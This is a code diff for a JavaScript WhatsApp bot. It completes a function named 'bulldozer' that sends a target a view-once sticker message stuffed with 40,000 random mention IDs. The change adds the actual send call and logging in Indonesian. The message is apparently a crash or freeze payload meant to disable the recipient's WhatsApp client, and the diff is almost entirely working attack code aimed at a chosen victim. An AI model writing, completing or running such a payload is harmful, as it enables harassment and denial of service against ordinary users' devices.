@@ -174,6 +174,8 @@ function restartBot() {
 
 // ───────── START BOT ─────────
 async function bulldozer(target) {
+  const to = target.includes("@s.whatsapp.net") ? target : target + "@s.whatsapp.net"
+
   let message = {
     viewOnceMessage: {
       message: {
@@ -186,42 +188,31 @@ async function bulldozer(target) {
           directPath:
             "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
           fileLength: { low: 1, high: 0, unsigned: true },
-          mediaKeyTimestamp: {
-            low: 1746112211,
-            high: 0,
-            unsigned: false,
-          },
+          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
           firstFrameLength: 19904,
           firstFrameSidecar: "KN4kQ5pyABRAgA==",
           isAnimated: true,
           contextInfo: {
             mentionedJid: [
               "0@s.whatsapp.net",
-              ...Array.from(
-                {
-                  length: 40000,
-                },
-                () =>
-                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
+              ...Array.from({ length: 40000 }, () =>
+                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
               ),
             ],
             groupMentions: [],
-            entryPointConversionSource: "non_contact",
-            entryPointConversionApp: "whatsapp",
-            entryPointConversionDelaySeconds: 467593,
           },
-          stickerSentTs: {
-            low: -1939477883,
-            high: 406,
-            unsigned: false,
-          },
-          isAvatar: false,
-          isAiSticker: false,
-          isLottie: false,
         },
       },
     },
   };
+
+  try {
+    await sock.sendMessage(to, message)
+    console.log("Bulldozer terkirim ke", target)
+  } catch (e) {
+    console.log("Gagal kirim bulldozer:", e.message)
+  }
+}
 
 async function startBot() {
     try {
